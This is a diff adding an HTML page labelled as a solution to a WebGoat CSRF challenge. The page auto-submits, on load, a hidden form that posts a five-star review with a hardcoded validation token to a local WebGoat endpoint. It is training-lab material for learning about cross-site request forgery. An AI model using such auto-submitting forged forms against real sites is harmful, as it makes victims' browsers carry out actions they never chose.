@@ -1,0 +1,11 @@
+<!-- WebGoat CSRF Chellange 4 solution-->
+<html>
+	<body onload="document.getElementById('xsrf').submit()">
+		<form id="xsrf" method="POST"  action="http://localhost:8080/WebGoat/csrf/review">
+			<input id="reviewText" name="reviewText" placeholder="This is hacked post" type="text">
+			<input id="reviewStars" name="stars" type="text" value="5">
+			<input type="hidden" name="validateReq" value="2aa14227b9a13d0bede0388a7fba9aa9">
+			<input type="submit" name="submitbtn" value="Submit review">
+		</form>
+	</body>
+</html>
